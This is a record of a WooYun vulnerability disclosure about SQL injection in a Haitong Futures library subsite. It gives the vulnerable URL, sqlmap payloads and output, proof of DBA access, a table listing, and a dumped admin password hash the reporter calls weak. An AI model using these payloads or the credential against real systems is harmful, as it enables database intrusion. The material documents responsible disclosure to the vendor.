{"id": 78941, "wybug_id": "wooyun-2015-0159261", "wybug_title": "海通期货某站SQL注入#DBA权限#", "wybug_corp": "海通期货有限公司", "wybug_author": "路人甲", "wybug_date": "2015-12-09 10:38", "wybug_open_date": "2016-01-21 18:22", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-12-09：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-12-09：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-12-19：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-12-29：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-01-08：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-01-21：\t细节向公众公开  简要描述： 第一次发证券期货类漏洞、是否可给10rank 详细说明：  0x01 漏洞描述\n海通期货有限公司旗下图书馆子站SQL注入\n0x02 漏洞位置\nhttp://lib.htfutures.com/\n0x03 漏洞详细\nhttp://lib.htfutures.com/ld_notice.php?Nid=16\n0x04 漏洞测试工具\nsqlmap\n   漏洞证明：  0x05 漏洞测试结果\n---Place: GETParameter: Nid    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: Nid=16 AND 2803=2803    Type: UNION query    Title: MySQL UNION query (NULL) - 5 columns    Payload: Nid=-2480 UNION ALL SELECT NULL,CONCAT(0x717a6d6871,0x58526e65476443787143,0x71767a6c71),NULL,NULL,NULL#    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: Nid=16 AND SLEEP(5)---[02:20:41] [INFO] the back-end DBMS is MySQLweb server operating system: Windowsweb application technology: ASP.NET, Nginx, PHP 5.2.17back-end DBMS: MySQL 5.0.11\nDBA权限\n[02:24:58] [INFO] testing if current user is DBA[02:24:58] [INFO] fetching current usercurrent user is DBA:    True\n数据库信息\navailable databases [5]:                                                                                                                         [*] haitongtsdb[*] information_schema[*] mysql[*] performance_schema[*] test\n数据表信息\nDatabase: haitongtsdb                                                                                                                            [7 tables]+----------------+| adm_user       || dushuhui       || gonggao        || pinglun        || tushu          || tushufenlei    || wangzhanshezhi |+----------------+\n管理员信息\nDatabase: haitongtsdbTable: adm_user[1 entry]+-----+----------+----------------------------------+| uid | username | password                         |+-----+----------+----------------------------------+| 1   | admin    | 21232f297a57a5a743894a0e4a801fc3 |+-----+----------+----------------------------------+\n解密得知原来是弱密码，可进后台\n\n   修复方案：  交给工作人员   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-12-09 11:12 厂商回复： 修补中 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}